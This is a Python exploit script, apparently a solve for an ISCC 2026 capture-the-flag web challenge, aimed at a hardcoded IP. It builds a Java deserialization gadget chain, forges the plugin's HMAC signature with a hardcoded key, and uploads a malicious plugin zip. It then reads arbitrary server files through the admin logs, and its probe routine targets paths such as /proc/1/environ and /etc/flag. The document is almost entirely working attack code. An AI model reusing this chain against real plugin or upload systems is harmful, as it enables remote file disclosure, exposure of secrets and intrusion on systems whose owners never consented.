#!/usr/bin/env python3
"""
Agent Plugin Management System - Full Exploit
ISCC 2026 Web Challenge

Usage:
  1. Place agent-core.jar in this directory
  2. Run: python3 solve.py

Prerequisites:
  - JDK 17+ (javac/java)
  - Python 3.7+
  - pip install requests
"""

import hashlib
import hmac
import base64
import json
import os
import re
import subprocess
import sys
import zipfile

import requests

TARGET = "http://39.105.213.28:9000"
HMAC_SECRET = b"k3y_5A62_X86"

JAVA_GENERATOR = """
import com.agent.update.deserialization.*;
import java.io.*;

public class PayloadGen {
    public static void main(String[] args) throws Exception {
        String path = args[0];

        FileExporter fe = new FileExporter();
        fe.setTeamId("admin");

        DataStream ds = new DataStream();
        ds.setExporter(fe);

        ResourceRefresher rr = new ResourceRefresher();
        rr.setTargetPath(path);
        rr.setDataStream(ds);

        FileOutputStream fos = new FileOutputStream("payload.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(rr);
        oos.close();
        fos.close();

        System.out.println("GENERATED: " + path);
    }
}
"""


def step1_generate(target_path: str) -> bytes:
    """Compile and run Java payload generator."""
    with open("_gen.java", "w") as f:
        f.write(JAVA_GENERATOR)

    jar = "agent-core.jar"
    subprocess.check_call(["javac", "-cp", jar, "_gen.java"])

    sep = ";" if os.name == "nt" else ":"
    subprocess.check_call(["java", "-cp", f".{sep}{jar}", "PayloadGen", target_path])

    with open("payload.bin", "rb") as f:
        return f.read()


def step2_pack(data: bytes) -> str:
    """Compute HMAC signature and create a valid plugin zip."""
    sig = base64.b64encode(
        hmac.new(HMAC_SECRET, data, hashlib.sha256).digest()
    ).decode()

    manifest = {
        "pluginName": "exploit",
        "version": "1.0.0",
        "hmacSignature": sig,
        "description": "",
    }

    out = "exploit.zip"
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("manifest.json", json.dumps(manifest))
        z.writestr("metadata.ser", data)

    print(f"  HMAC: {sig}")
    return out


def step3_upload(zip_path: str, team: str = "zz") -> int:
    """Upload the malicious plugin to trigger deserialization."""
    url = f"{TARGET}/api/upload?team_id={team}"
    with open(zip_path, "rb") as f:
        r = requests.post(url, files={"file": ("plugin.zip", f, "application/zip")})
    print(f"  Status: {r.status_code}")
    # 500 is expected (ClassCastException after chain fires)
    return r.status_code


def step4_read_logs() -> list:
    """Retrieve all admin log entries."""
    r = requests.get(f"{TARGET}/api/logs?team_id=admin")
    return r.json().get("logs", [])


def step5_extract(logs: list) -> str | None:
    """Search logs for ISCC{...} pattern and return the flag."""
    for entry in logs:
        msg = entry.get("message", "")
        matches = re.findall(r"ISCC\{[A-Za-z0-9_]+\}", msg)
        for m in matches:
            if "f4k3" not in m:
                return m
    return None


def probe_paths():
    """Try multiple flag paths and report results."""
    paths = [
        "/etc/flag",
        "/opt/app/flag",
        "/app/agent-update-system.jar",
        "/proc/1/cmdline",
        "/proc/1/environ",
    ]
    for p in paths:
        print(f"\n[Probe] {p}")
        try:
            data = step1_generate(p)
            zipf = step2_pack(data)
            step3_upload(zipf, f"z{p.split('/')[-1]}")
            logs = step4_read_logs()
            for entry in logs:
                msg = entry.get("message", "")
                if p in msg:
                    if "Content:" in msg:
                        content = msg.split("Content:")[-1][:200]
                        print(f"  Content: {content}")
                    elif "Error:" in msg:
                        print(f"  Error: file not found or unreadable")
                        break
                    break
        except Exception as e:
            print(f"  Fail: {e}")


def cleanup():
    for f in ["_gen.java", "PayloadGen.class", "payload.bin", "exploit.zip"]:
        if os.path.exists(f):
            os.remove(f)


if __name__ == "__main__":
    print("=" * 55)
    print("Agent Plugin Management System - Exploit")
    print("=" * 55)

    if not os.path.exists("agent-core.jar"):
        print("[!] agent-core.jar not found in current directory.")
        print("    Download from:", f"{TARGET}/downloads/agent-core.jar")
        sys.exit(1)

    # Phase 1: Generate the payload for the running jar
    print("\n[1/4] Generating serialized payload...")
    payload = step1_generate("/app/agent-update-system.jar")
    print(f"  Size: {len(payload)} bytes")

    # Phase 2: Create a valid plugin zip with HMAC
    print("\n[2/4] Creating malicious plugin...")
    zip_name = step2_pack(payload)
    print(f"  Zip: {zip_name}")

    # Phase 3: Upload to trigger the deserialization chain
    print("\n[3/4] Triggering deserialization...")
    step3_upload(zip_name)

    # Phase 4: Read flag from admin logs
    print("\n[4/4] Extracting flag from admin logs...")
    logs = step4_read_logs()
    flag = step5_extract(logs)

    if flag:
        print(f"\n{'=' * 55}")
        print(f"  FLAG: {flag}")
        print(f"{'=' * 55}")
    else:
        print("  No flag found in logs yet.")
        print("  The server may have run out of memory reading the 19MB jar.")
        print("  Try a different path:")
        for p in ["/etc/flag", "/opt/app/flag", "/proc/1/cmdline"]:
            print(f"    python3 solve.py --probe {p}")

    # Print summary of all log entries
    print(f"\n  Log entries: {len(logs)}")
    for entry in logs:
        print(f"    [{entry.get('action', '?')}] {entry.get('message', '')[:120]}")

    cleanup()
